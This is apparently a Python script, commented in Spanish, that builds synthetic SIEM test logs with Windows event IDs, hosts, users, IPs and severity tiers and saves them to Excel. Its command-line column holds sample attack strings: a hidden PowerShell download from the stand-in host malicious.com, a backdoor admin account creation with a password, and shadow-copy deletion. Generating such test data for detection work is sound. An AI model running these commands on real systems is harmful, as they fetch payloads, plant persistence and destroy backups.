import pandas as pd
import numpy as np
import os

# Generamos datos de prueba con una distribución rica en incidentes y positivos en diferentes tiers (Severidades)
np.random.seed(123)
n_rows = 250

log_ids = [f"EVT-{str(i).zfill(5)}" for i in range(1, n_rows + 1)]
timestamps = pd.date_range(start="2026-10-23 08:00:00", periods=n_rows, freq="15s")
hostnames = np.random.choice(["WS-018", "WEB-01", "DC-01", "FS-SRV01", "DB-02", "SOC-SRV01"], size=n_rows)
event_ids = np.random.choice([7036, 4625, 4624, 4688, 1102, 4672, 4719], size=n_rows)
users = np.random.choice(["CORP\\helpdesk", "CORP\\jlopez", "CORP\\admin", "SYSTEM", "ANONYMOUS", "CORP\\svc_sql"], size=n_rows)
source_ips = np.random.choice(["10.10.3.18", "10.10.1.22", "192.168.1.50", "45.33.32.156", "185.220.101.5", "10.0.0.99"], size=n_rows)
destinations = np.random.choice(["DC-01", "FS-SRV01", "WEB-01", "DB-02", "EXCH-01"], size=n_rows)
log_sources = np.random.choice(["System", "Security", "PowerShell", "Sysmon"], size=n_rows)

event_descriptions = np.random.choice([
    "Brute Force Attack Detected - Multiple Failed Logins",
    "Suspicious PowerShell Execution with Encoded Command",
    "Lateral Movement Attempt via SMB/RPC",
    "Privilege Escalation Detected (Special Logon)",
    "Successful Logon from External Suspicious IP",
    "Service entered running state",
    "Audit log cleared or modified"
], size=n_rows)

# Command lines variados para ataques reales
command_lines = np.random.choice([
    None,
    "powershell.py -enc JABBAQAgAEMAbwBtAG0AYQBuAGQA...",
    "cmd.exe /c whoami /all && net localgroup administrators",
    "net user /add backdoor_admin Pa$$w0rd123!",
    "vssadmin delete shadows /all /quiet",
    "powershell -nop -w hidden -c Invoke-WebRequest -Uri http://malicious.com/payload.ps1"
], size=n_rows, p=[0.3, 0.25, 0.15, 0.1, 0.1, 0.1])

results = np.random.choice(["Success", "Failure", "Blocked"], size=n_rows, p=[0.4, 0.4, 0.2])

# Distribución equilibrada en diferentes Tiers de Severidad (Informational, Medium, High, Critical)
severities = np.random.choice(["Informational", "Medium", "High", "Critical"], size=n_rows, p=[0.2, 0.3, 0.3, 0.2])

df_test = pd.DataFrame({
    'Log_ID': log_ids,
    'Timestamp': timestamps,
    'Hostname': hostnames,
    'Event_ID': event_ids,
    'User': users,
    'Source_IP': source_ips,
    'Destination': destinations,
    'Log_Source': log_sources,
    'Event_Description': event_descriptions,
    'Process_CommandLine': command_lines,
    'Result': results,
    'Severity': severities
})

# Guardar directamente en la carpeta data/ de tu proyecto actual
os.makedirs("data", exist_ok=True)
output_path = "data/SIEM_Test_Logs_Sample.xlsx"

with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
    df_test.to_excel(writer, sheet_name='SIEM Export', index=False)

print(f"¡Archivo Excel con múltiples positivos y tiers generado con éxito en: {output_path}!")